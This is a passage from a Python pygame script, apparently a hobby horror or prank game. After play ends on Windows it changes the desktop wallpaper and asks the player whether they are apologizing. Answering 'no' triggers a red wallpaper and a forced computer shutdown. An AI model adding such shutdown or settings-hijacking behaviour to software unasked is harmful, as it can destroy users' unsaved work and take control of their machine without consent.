                logging.info("Apology screen closed via QUIT event.")
                return "QUIT"
            if event.type == pygame.KEYDOWN:
                if event.key in (pygame.K_LEFT, pygame.K_RIGHT):
                    selected_apology_option = 1 - selected_apology_option
                if event.key in (pygame.K_RETURN, pygame.K_SPACE):
                    return "YES" if selected_apology_option == 0 else "NO"

        apology_screen_surface.fill((10, 0, 0))
        pygame.draw.rect(apology_screen_surface, (255, 0, 0), (5, 5, 490, 190), 2)
        question_text = apology_font.render("are you apologizing?", True, (255, 0, 0))
        apology_screen_surface.blit(question_text, (500//2 - question_text.get_width()//2, 50))
        yes_color = (255, 100, 100) if selected_apology_option == 0 else (200, 0, 0)
        no_color = (255, 100, 100) if selected_apology_option == 1 else (200, 0, 0)
        yes_text = option_font.render("yes", True, yes_color)
        no_text = option_font.render("no", True, no_color)
        apology_screen_surface.blit(yes_text, (120, 130))
        apology_screen_surface.blit(no_text, (500 - 120 - no_text.get_width(), 130))
        pygame.display.flip()
        await asyncio.sleep(1.0 / FPS)

    return "QUIT"

async def final_message_screen():
    final_screen_surface = pygame.display.set_mode((600, 150))
    pygame.display.set_caption("...")
    final_font = pygame.font.SysFont("Courier", 24, bold=True)
    final_screen_surface.fill((10, 10, 20))
    message = final_font.render("I will believe you one last time.", True, (200, 200, 220))
    final_screen_surface.blit(message, (600//2 - message.get_width()//2, 150//2 - message.get_height()//2))
    pygame.display.flip()
    await asyncio.sleep(4)
    logging.info("Final forgiveness message displayed.")

async def main():
    game_running = True
    while game_running:
        game_running = main_loop()
        if not game_running:
            break
        await asyncio.sleep(1.0 / FPS)

    pygame.quit()

 # im tired guys

    if platform.system() == "Windows" and win32_available:
        if not game_running:
            logging.info("Starting finale...")
            set_solid_color_wallpaper((0, 0, 0))
            await asyncio.sleep(2)

            pygame.init()
            pygame.font.init()
            apology_result = await apology_screen()
            pygame.quit()

            if apology_result == "YES":
                pygame.init()
                pygame.font.init()
                await final_message_screen()
                pygame.quit()
                restore_original_settings()
                logging.info("Settings restored after apology.")
            elif apology_result == "NO":
                set_solid_color_wallpaper((150, 0, 0))
                show_final_message()
                shutdown_computer()
            else:
                restore_original_settings()
                logging.info("Settings restored after manual close.")
        else:
            restore_original_settings()
            logging.info("Game closed. Settings restored.")
    else:
        logging.info("Final scene is only available on Windows.")

if platform.system() == "Emscripten":
    asyncio.ensure_future(main())
else:
    if __name__ == "__main__":
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            logging.info("Program interrupted by user.")
        finally:
            if platform.system() == "Windows" and win32_available:
                restore_original_settings()
                logging.info("Original desktop settings restored.") # YEEEESSS END